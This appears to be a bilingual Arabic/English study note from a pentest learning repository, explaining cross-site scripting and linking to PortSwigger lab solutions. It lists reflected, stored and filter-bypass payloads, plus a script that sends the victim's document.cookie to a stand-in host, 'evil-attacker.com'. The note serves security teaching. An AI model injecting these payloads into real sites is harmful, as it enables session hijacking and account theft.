
# Cross-Site Scripting (XSS) | اختراق المواقع عبر السكربتات

> **OWASP Category:** [A03 - Injection](../README.md)  
> **Methodology:** [Step-10 - XSS Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-10-XSS-Testing.md)  
> **PortSwigger Labs:** [Solutions](../../../portswigger-labs/Client-Side/XSS/)

---

## ما هي؟ | What is it?

ثغرة تحدث عندما يتمكن المهاجم من حقن سكربتات خبيثة (غالباً JavaScript) في صفحات الويب التي يشاهدها مستخدمون آخرون. بدلاً من استهداف السيرفر مباشرة، تستهدف هذه الثغرة "متصفح الضحية" لسرقة الكوكيز (Cookies)، أو جلسات الدخول (Sessions)، أو القيام بأفعال نيابة عن المستخدم.

---

## كيف تستغلها؟ (خطوات مفصلة) | How to Exploit?

### 1. مرحلة الرصد | Enumeration

- ابحث عن أي مكان يستقبل مدخلات من المستخدم ويعيد عرضها في الصفحة، مثل:
    - مربعات البحث (Search bars)
    - نموذج التعليقات (Comments)
    - خانات "الاسم الأول" و"الاسم الأخير" في البروفايل
    - رسائل الخطأ التي تظهر اسم المستخدم

### 2. التحليل عبر Burp Suite | Analysis via Burp Suite

- قم بحقن نص مميز (مثل `Ali123`) في كل خانة إدخال.
- ابحث عن هذا النص في الـ Response Body لترى أين يظهر (هل يظهر داخل `<div>`, أم داخل `<input value="...">`, أم داخل كود script؟).

### 3. حقن السكربت | Payload Injection

#### Reflected XSS | XSS انعكاسي
جرب حقن كود بسيط في رابط البحث:
```html
<script>alert(1)</script>
```

#### Stored XSS | XSS مخزن
قم بحفظ الكود في مكان دائم مثل "التعليقات" ليعمل عند كل شخص يزور الصفحة.

#### تخطي الفلاتر | Bypassing Filters
إذا كان السيرفر يمنع `<script>`, جرب استخدام "الأحداث" (Events):
```html
<img src=x onerror=alert(1)>
```
أو
```html
<svg onload=alert(1)>
```

### 4. تأكيد الاستغلال | Impact Verification

الهدف الحقيقي ليس إظهار نافذة Alert، بل سرقة البيانات:
```html
<script>fetch('https://evil-attacker.com/steal?cookie=' + document.cookie)</script>
```

إذا وصل "الكوكيز" الخاص بالضحية إلى سيرفرك = تم الاستغلال بنجاح.

---

## 🔍 كيفية اكتشافها في منهجيتي | How to Find in My Methodology

> 📂 **راجع ملف المنهجية التفصيلي:**  
> [Web-Pentest-Methodology - Phase 3 - XSS Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-10-XSS-Testing.md)

---

## 🧪 مختبرات PortSwigger | PortSwigger Labs

| المختبر | الصعوبة | الحل |
|---------|--------|------|
| Reflected XSS into HTML context | Apprentice | [الحل](../../../portswigger-labs/Client-Side/XSS/01-reflected-html.md) |
| Stored XSS into HTML context | Apprentice | [الحل](../../../portswigger-labs/Client-Side/XSS/02-stored-html.md) |
| DOM XSS in document.write sink | Apprentice | [الحل](../../../portswigger-labs/Client-Side/XSS/03-dom-document-write.md) |
| Reflected XSS with event handlers | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/04-reflected-event-handlers.md) |
| Reflected XSS with some SVG tags | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/05-reflected-svg.md) |
| Stored XSS into onclick event | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/06-stored-onclick.md) |
| Reflected XSS with AngularJS sandbox escape | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/07-angularjs-sandbox.md) |
| Reflected XSS with encoded tags | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/08-reflected-encoded.md) |
| DOM XSS using web messages | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/09-dom-web-messages.md) |
| DOM XSS via localStorage | Practitioner | [الحل](../../../portswigger-labs/Client-Side/XSS/10-dom-localstorage.md) |
